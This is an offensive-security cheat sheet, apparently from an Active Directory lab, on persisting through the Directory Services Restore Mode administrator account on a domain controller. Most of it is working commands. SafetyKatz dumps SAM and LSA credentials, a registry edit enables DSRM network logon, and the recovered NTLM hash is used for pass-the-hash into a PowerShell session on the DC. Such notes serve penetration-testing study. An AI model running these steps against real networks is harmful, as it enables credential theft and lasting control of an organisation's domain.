# DSRM

Tags: #AD #Windows #Powershell #SafetyKatz 

```bash 
- DSRM is Directory Services Restore Mode.
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
```

[![DSRM.png | 800](https://i.postimg.cc/1z7Z07qq/DSRM.png)](https://postimg.cc/xkm7nRgf)


```powershell 
❯ SafetyKatz.exe "token::elevate" "lsadump::sam"    # Dump DSRM password (needs DA privs)

❯ SafetyKatz.exe "lsadump::lsa /patch"              # Compare the Administrator hash with the Administrator hash of below command

Notes:
	1. First one is the DSRM local Administrator.
```

```powershell 
# Since it is the local administrator of the DC, we can pass the hash to authenticate. But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash

❯ winrs -r:dcorp-dc cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

```powershell 
# Use below commands to Pass-the-hash of DSRM administrator and access the DC:
❯ SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"

❯ Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1

❯ Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```